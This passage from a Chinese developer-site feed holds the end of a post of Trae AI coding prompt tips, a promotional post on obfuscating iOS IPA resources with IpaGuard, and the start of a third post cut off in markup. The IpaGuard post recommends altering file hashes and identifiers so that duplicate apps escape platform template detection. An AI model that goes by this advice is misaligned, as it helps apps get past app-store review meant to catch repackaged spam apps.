<code>Prompt</code> 工程和习惯）和项目规则（项目管理最佳实践）来聊聊，这些都是我踩坑 + 总结出来的，能显著提升效率和代码质量。我还参考了全网（如<code>Reddit</code>、<code>GitHub</code>、<code>Medium</code>上的讨论）最好用的 <code>Prompt</code> 和 <code>Rules</code> 示例，进一步优化了这些技巧，确保更实用和高效。</p>
<h4 data-id="heading-7">个人规则：让 <code>Trae</code> 懂你的 <code>Prompt</code> 技巧</h4>
<p><code>Trae</code> 的核心是自然语言交互，<code>Prompt</code> 写得好，输出质量翻倍。我的个人规则是结构化 + 迭代 + 指定约束，避免一次性扔大需求。基于社区分享，我优化了模板和习惯，确保 <code>AI</code> 更精准响应。</p>
<ol>
<li>
<p><strong>结构化 <code>Prompt</code> 模板</strong></p>
<p>每次新建对话，我都用这个升级版模板开头，能让 <code>Trae</code> 更快进入状态，并覆盖任务（<code>Task</code>）、需求（<code>Requirements</code>）、架构（<code>Architecture</code>）、期望（<code>Expectations</code>）。这源于全网最佳实践，能提升输出一致性：</p>
<pre><code class="hljs language-css" lang="css">你是一个资深全栈工程师，擅长React + Node<span class="hljs-selector-class">.js</span> + TailwindCSS。
项目任务（Task）：<span class="hljs-selector-attr">[简述核心任务，比如“构建一个个人仪表盘”]</span>
需求细节（Requirements）：<span class="hljs-selector-attr">[列出功能需求，比如“支持实时数据可视化、暗黑模式切换、用户认证”]</span>
架构设计（Architecture）：<span class="hljs-selector-attr">[指定结构，比如“使用Next.js 14作为前端框架，Prisma ORM处理数据库，部署到Vercel”]</span>
期望输出（Expectations）：<span class="hljs-selector-attr">[定义风格和质量，比如“函数式组件，TypeScript严格类型，注释详细，先思考步骤再生成代码，避免低级错误”]</span>
现在，请一步步思考并生成<span class="hljs-selector-attr">[具体任务，比如“首页布局和数据获取逻辑”]</span>
</code></pre>
<p>好处：<code>Trae</code> 会自动规划步骤，输出更可靠。比乱描述效率高30%，社区反馈显示，这种框架减少了 <code>AI</code> 的误解率。</p>
</li>
<li>
<p><strong>小步迭代 + 反馈循环</strong></p>
<p>别一次性要完整项目！我的规则：先 <code>vibe</code> 骨架（布局+路由），运行测试，再迭代功能。 反馈时用：“在上次代码基础上，优化XX部分，因为XX问题，加XX功能。” 技巧：复制上一次的关键代码片段贴回去，<code>Trae</code> 上下文强，能无缝接上。</p>
</li>
<li>
<p><strong>模型切换规则</strong></p>
<ul>
<li>
<p><strong><code>DeepSeek</code></strong>：原型速刷、代码生成首选（快+准+免费）。</p>
</li>
<li>
<p><strong><code>Claude Opus/Sonnet</code></strong>：复杂逻辑、架构设计、代码审查（推理最强，少幻觉）。</p>
</li>
<li>
<p><strong><code>GPT</code> 系列</strong>：多模态任务（如集成图像 <code>API</code>）或创意 <code>UI</code>。</p>
<p>我的习惯：<code>Builder</code> 模式默认 <code>DeepSeek</code>，卡壳时切 <code>Claude</code> 审查。</p>
</li>
</ul>
</li>
<li>
<p><strong>长上下文管理技巧</strong></p>
<p><code>Trae</code> 支持 <code>MCP</code>，项目大了别丢上下文！规则：</p>
<ul>
<li>关键文件用“@文件名”引用。</li>
<li>定期总结：“请基于当前项目上下文，总结已完成功能和待办。”</li>
<li><code>SOLO</code> 模式下，让代理记住项目目标，避免跑偏。</li>
</ul>
</li>
<li>
<p><strong>避坑小习惯</strong></p>
<ul>
<li>总是要求先思考步骤，再生成代码（减少低级错误）。</li>
<li>生成后立即运行测试（<code>Trae</code> 内置预览超方便）。</li>
<li>保存好 <code>Prompt</code> 模板到笔记，复用率高。</li>
</ul>
</li>
</ol>
<h4 data-id="heading-8">项目规则：从 <code>vibe</code> 到生产级的管理技巧</h4>
<p>纯 <code>Vibe</code> 容易原型神器，维护地狱，所以我定了这些项目规则，确保代码可维护。</p>
<ol>
<li>
<p><strong>分层开发规则（原型 → 精炼 → 生产）</strong></p>
<ul>
<li>
<p><strong>阶段1</strong>：纯 <code>Vibe</code> 原型（1-2小时）：自然语言描述核心功能，快速出 <code>demo</code>。</p>
</li>
<li>
<p><strong>阶段2</strong>：人工精炼（必做！）：用 <code>Claude</code> 审查代码，重构架构（分层、模块化）。</p>
</li>
<li>
<p><strong>阶段3</strong>：生产优化：加类型检查、错误处理、性能优化。</p>
<p>例子：我那个时间线网站，先 <code>vibe</code> 出交互表格，再手动加响应式和动画。</p>
</li>
</ul>
</li>
<li>
<p><strong>版本控制整合</strong></p>
<p>规则：<code>Trae</code> 生成代码后，立刻 <code>Git commit</code>。</p>
<p><code>Prompt</code> 加一句：“请生成代码时，顺便输出 <code>git diff</code> 格式的变更，便于提交。” 这样项目历史清晰，后期回滚超方便。</p>
</li>
<li>
<p><strong><code>SOLO</code> 模式使用规则</strong></p>
<p><code>SOLO</code> 是 <code>Trae</code> 杀手锏（自主代理），但别滥用：</p>
<ul>
<li>
<p>小项目：直接 <code>SOLO</code> 全自动。</p>
</li>
<li>
<p>大项目：先 <code>Builder</code> 规划，再 <code>SOLO</code> 执行子任务（如“独立实现登录模块”）。</p>
<p>技巧：设置停止条件，“完成后问我是否继续”。</p>
</li>
</ul>
</li>
<li>
<p><strong>部署</strong>：一键部署：<code>Trae</code> 支持 <code>Vercel/Netlify</code>，直接在对话里说“帮我生成 <code>deploy</code> 配置”。</p>
</li>
<li>
<p><strong>质量把控规则</strong></p>
<ul>
<li>每生成大块代码，必用 <code>Claude</code> 审查：“请审查以下代码，找出潜在 <code>bug</code>、安全问题和优化点。”</li>
<li>测试驱动：要求 <code>Trae</code>“先生成测试用例，再实现功能”。</li>
<li>安全意识：敏感数据别硬编码，用环境变量。</li>
</ul>
</li>
</ol>
<h4 data-id="heading-9"><code>Trae Rules</code> 高级扩展：全网最佳实践</h4>
<p><code>Trae</code> 的 <code>Rules</code> 功能允许你创建持久规则文件（类似于配置文件），让 <code>AI</code> 记住项目偏好、代码规范和交互方式，避免每次 <code>Prompt</code> 都从零开始。全网热门建议强调：<code>Rules</code> 是提升效率的核心，能让 <code>AI</code> 像团队标准一样运作。下面是优化后的示例和技巧：</p>
<ol>
<li>
<p><strong>创建项目级 <code>Rules</code> 文件</strong></p>
<p>在设置中点击规则，然后添加项目规则即可。示例：</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 项目规则：React Web App</span>
代码风格：始终使用函数式组件、TypeScript类型检查、ESLint标准。避免<span class="hljs-keyword">class</span>组件。
架构规范：前端分层（<span class="hljs-title">components</span>, <span class="hljs-title">hooks</span>, <span class="hljs-title">services</span>）；后端用<span class="hljs-title">Node.js</span> + <span class="hljs-title">Express</span>。
测试要求：每个功能模块必须生成<span class="hljs-title">Jest</span>测试用例。
安全规则：敏感数据用环境变量；避免硬编码<span class="hljs-title">API</span>密钥。
交互习惯：输出前先总结步骤；如果不确定，问用户确认。
</code></pre>
<p>好处：加载项目后，<code>AI</code> 自动应用这些规则。社区反馈：这能减少幻觉，提高代码一致性 30% 以上。</p>
</li>
<li>
<p><strong>让 <code>AI</code> 自动生成 <code>Rules</code></strong></p>
<p>全网金牌技巧：先让 <code>AI</code> 扫描项目，然后生成规则。<code>Prompt</code> 示例： “阅读项目每个重要目录（如<code>src</code>, <code>components</code>），然后基于最佳实践组织项目 <code>Rules</code>，包括代码风格和架构建议。输出为<code>.md</code>格式。” 这让 <code>Rules</code> 更智能，适合大项目。</p>
</li>
<li>
<p><strong><code>Rules</code> 与 <code>SOLO/Builder</code> 模式结合</strong></p>
<p>在 <code>SOLO</code> 模式下，<code>Rules</code> 能让代理自主遵守规范。示例 <code>Prompt</code>： “激活项目 <code>Rules</code> 后，在 <code>SOLO</code> 模式下构建登录模块：包括 <code>JWT</code> 认证和前端表单。”</p>
<p>避坑：定期更新 <code>Rules</code>，避免过时；如果 <code>Rules</code> 冲突，优先手动覆盖。</p>
</li>
</ol>
<p>这些规则让我 2025 年出了10+ 个小项目，效率爆炸，还保持了代码质量。<code>Trae</code> 不是万能，但用对方法，它真的是编程解放神器。作为 <code>Trae</code> 和 <code>Cursor</code> 的忠实付费用户，我发现付费版在处理大型项目时提供了无与伦比的自由和速度——<code>Cursor</code> 的 <code>Pro</code> 计划（$20/月）解锁了无限快速请求和高级代理使用，而 <code>Trae</code> 的 <code>Pro</code> 则以低成本提供了类似优势，让我能无缝混用两者。</p>
<hr/>
<h3 data-id="heading-10">对 2026 年及未来的展望</h3>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/55c5a57ead304a799a43f9ffb9b23960~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA54K55LiA5pyo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768297999&amp;x-signature=qduVyZhza7IcKdYilxC2p7JUvYU%3D" alt="g2LGXsDegA80OyszLls_L" loading="lazy"/></p>
<p>2026 年，<code>Agentic AI</code> 会更成熟：多代理协作成常态，超级代理跨系统协调。<code>Vibe Coding</code> 将完全主流化，但会加强监督机制（避免维护地狱）。端侧 <code>AI</code>（如 <code>Apple Intelligence</code> 扩展）和安全治理会是重点，开源生态继续主导。</p>
<p>长远看，<code>AI</code> 不会取代开发者，而是让我们专注更高价值的事——创意、架构、产品思考。未来编程可能像“导演电影”：描述愿景，<code>AI</code> 负责执行细节。</p>
<p>2025 年对我来说是解放之年，感谢所有 <code>AI</code> 工具，尤其是 <code>Trae</code> 的陪伴。2026，我会继续用 <code>Vibe</code> 方式探索更多可能性。</p>
<p>你 2025 年最爱的 <code>AI</code> 工具是哪个？欢迎评论区交流！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何保护 iOS IPA 文件中的资源与文件安全]]></title>    <link>https://juejin.cn/post/7592059801884049451</link>    <guid>https://juejin.cn/post/7592059801884049451</guid>    <pubDate>2026-01-06T09:56:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592059801884049451" data-draft-id="7592059801884033067" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何保护 iOS IPA 文件中的资源与文件安全"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-06T09:56:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="开心就好2025"/> <meta itemprop="url" content="https://juejin.cn/user/3850962908492660"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何保护 iOS IPA 文件中的资源与文件安全
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3850962908492660/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    开心就好2025
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:56:42.000Z" title="Tue Jan 06 2026 09:56:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>做 iOS 安全一段时间后，很容易形成一个误区：只要二进制够复杂、符号被混淆，应用就安全了。</p>
<p>但真正被频繁修改、替换、二次打包的，往往不是 Mach-O 本身，而是 <strong>IPA 里的资源和文件</strong>。
图片、JSON、HTML、JS、配置文件，这些内容对攻击者来说更直观，也更好下手。</p>
<p>如何保护 iOS IPA 文件中的资源与文件安全，本质上是一个流程问题。</p>
<hr/>
<h2 data-id="heading-0">从实际项目看，资源通常是怎么被利用的</h2>
<p>在一次比较典型的排查中，我们发现攻击者的路径大致是：</p>
<ul>
<li>解包 IPA</li>
<li>直接通过文件名定位关键资源（如 <code>pay_config.json</code>、<code>vip.js</code>）</li>
<li>修改内容或整体替换</li>
<li>重新签名并分发</li>
</ul>
<p>整个过程不涉及复杂逆向，成本低、成功率高。</p>
<p>这也是为什么单纯依赖代码混淆，很难覆盖这类风险。</p>
<hr/>
<h2 data-id="heading-1">资源安全的前提，是“别让人一眼看懂你在干什么”</h2>
<p>资源文件本身不可避免地存在于 IPA 中，问题不在于“有没有”，而在于：</p>
<ul>
<li>能不能通过名字快速判断用途</li>
<li>能不能轻易比对出是否被替换</li>
<li>被替换后是否难以追溯来源</li>
</ul>
<p>围绕这三个点，实际可落地的手段并不少。</p>
<hr/>
<h2 data-id="heading-2">文件名混淆：最容易被忽视的一步</h2>
<p>很多工程里，资源命名是非常“自解释”的：</p>
<ul>
<li><code>login_bg.png</code></li>
<li><code>order_api.json</code></li>
<li><code>activity_h5/index.html</code></li>
</ul>
<p>这些名字本身就等于一份说明文档。</p>
<p>在 IPA 层面对文件名进行处理，是成本最低、收益却很稳定的一步。
<strong>IpaGuard</strong> 在这一步的作用比较直接：</p>
<ul>
<li>将图片、JS、JSON、HTML、音频等资源文件重命名为无意义字符串</li>
<li>同时修正引用关系，保证运行不受影响</li>
</ul>
<p>这样做并不是为了“防止读取”，而是让分析者无法通过文件名快速定位目标。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f57f26c33bd46799d0d65e0da66040b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5b-D5bCx5aW9MjAyNQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298202&amp;x-signature=voToIRPqNQJf1UK71zbR%2Fmv9hsg%3D" alt="文件名称混淆" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-3">修改 MD5 与标识信息，解决“被整体复用”的问题</h2>
<p>在一些上架或分发场景中，问题并不来自个人攻击，而是平台层面的判定：</p>
<ul>
<li>同一套资源被多个 IPA 使用</li>
<li>文件哈希高度一致</li>
<li>框架、图片、资源结构相似</li>
</ul>
<p>这类情况，很容易被认定为模板化应用或重复应用。</p>
<p>在资源层面，<strong>修改文件 MD5、UDID 等标识信息</strong>，可以有效打断这种关联性判断。</p>
<p>IpaGuard 支持在不改变资源显示效果的前提下，对这些值进行调整，使每个 IPA 在资源层面表现为“独立产物”。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/638d27da605844e4858b396a4385eeab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5b-D5bCx5aW9MjAyNQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298202&amp;x-signature=4TkezTvGjHQVQLLp3ncCFzcssuk%3D" alt="修改md5值" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-4">不可见水印，更偏向事后而不是事前</h2>
<p>图片资源往往是被直接拷贝使用的对象。
在一些商业项目里，更关心的是“被谁用走了”，而不只是“有没有被用”。</p>
<p>给图片资源添加不可见水印，是一种偏向溯源的手段：</p>
<ul>
<li>不影响视觉效果</li>
<li>不增加额外逻辑</li>
<li>后期可通过特征识别来源</li>
</ul>
<p>IpaGuard 提供的不可见水印能力，正好适合这类需求，更多是工程管理层面的价值，而非单纯防护。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0334ec78ed241e6bdfdcab21b017356~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5b-D5bCx5aW9MjAyNQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298202&amp;x-signature=Y%2BkcsB8al8gSwzi8lQvEXCZWDpk%3D" alt="不可见水印" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-5">HTML / JS / CSS 的处理，不只是压缩这么简单</h2>
<p>前端资源通常已经过构建，但在 IPA 中依然可能保留：</p>
<ul>
<li>可读格式</li>
<li>清晰的模块结构</li>
<li>明确的入口文件</li>
</ul>
<p>在 IPA 阶段再做一次处理，意义在于：</p>
<ul>
<li>进一步降低可读性</li>
<li>统一资源风格</li>
<li>减少体积，同时增加分析成本</li>
</ul>
<p>通过对 HTML、JS、CSS 进行压缩和重排，即使不涉及源码层的混淆，也能明显提高理解门槛。</p>
<hr/>
<h2 data-id="heading-6">清理调试信息，是“收尾”但不是可选项</h2>
<p>有些 IPA 即便已经发布，仍残留：</p>
<ul>
<li>符号调试信息</li>
<li>开发阶段遗留的描述字符串</li>
<li>无用的中间数据</li>
</ul>
<p>这些内容对运行没有帮助，却会显著降低逆向成本。</p>
<p>在 IPA 成品阶段删除这些调试信息，是一次性的清理工作，却能长期降低风险。
IpaGuard 在这一环节提供了比较稳定的处理能力，适合放在混淆流程的末尾。</p>
<hr/>
<h2 data-id="heading-7">把这些步骤串起来，才是可复用的方案</h2>
<p>在真实工程中，这些手段往往不会单独存在，而是组合使用：</p>
<ul>
<li>Keychain 用于真正敏感的数据存储</li>
<li>加密手段保护必须运行时解密的内容</li>
<li>IpaGuard 处理资源命名、MD5、水印、调试信息</li>
<li>重新签名并完整测试</li>
</ul>
<p>这样形成的，是一个围绕 IPA 成品的安全闭环。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[短思考第270天，2025年赚麻的风口，2026年必冲赛道]]></title>    <link>https://juejin.cn/post/7592069113221660691</link>    <guid>https://juejin.cn/post/7592069113221660691</guid>    <pubDate>2026-01-06T09:56:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592069113221660691" data-draft-id="7592069113221627923" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="短思考第270天，2025年赚麻的风口，2026年必冲赛道"/> <meta itemprop="keywords" content="前端,AI编程,创业"/> <meta itemprop="datePublished" content="2026-01-06T09:56:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员码歌"/> <meta itemprop="url" content="https://juejin.cn/user/764915820529831"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            短思考第270天，2025年赚麻的风口，2026年必冲赛道
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/764915820529831/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员码歌
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T09:56:07.000Z" title="Tue Jan 06 2026 09:56:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 